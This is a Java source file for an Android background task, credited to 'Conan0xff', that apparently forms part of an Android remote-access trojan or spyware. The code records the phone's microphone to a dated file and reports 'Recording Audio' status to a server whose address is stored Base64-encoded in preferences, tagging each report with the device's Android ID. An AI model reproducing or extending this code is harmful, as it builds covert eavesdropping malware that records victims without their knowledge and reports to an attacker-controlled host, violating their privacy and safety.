package com.asynctask;

import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by Conan0xff on 2017/12/1.
 */


public class recordAudio extends AsyncTask<String, Void, String> {
    String i = "0";

    public recordAudio(String i) {
        this.i = i;
    }

    @Override
    protected String doInBackground(String... params) {
        MediaRecorder recorder = new MediaRecorder();
        ;

        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
        String currentDateandTime = sdf.format(new Date());

        String filename = currentDateandTime + ".3gp";

        File diretory = new File(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("File", "") + File.separator + "Audio");
        diretory.mkdirs();
        File outputFile = new File(diretory, filename);

        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setMaxDuration(Integer.parseInt(i));
        recorder.setMaxFileSize(1000000);
        recorder.setOutputFile(outputFile.toString());

        try {
            recorder.prepare();
            recorder.start();
        } catch (IOException e) {
            Log.i("com.connect", "io problems while preparing");
            e.printStackTrace();
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {

        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Recording Audio");
        } catch (UnsupportedEncodingException e1) {
            e1.printStackTrace();
        }
        try {
            Thread.sleep(Integer.parseInt(i) + 2500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
//        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Media", false).commit();
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Recording Audio Complete");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
//        while (PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getBoolean("Media", false) == true) {
//            try {
//                Thread.sleep(5000);
//                Log.d("recordAudio","Media still false");
//            } catch (InterruptedException e) {
//                e.printStackTrace();
//            }
//        }
//        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Media", true).commit();
//        Log.d("recordAudio","Media become true");
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
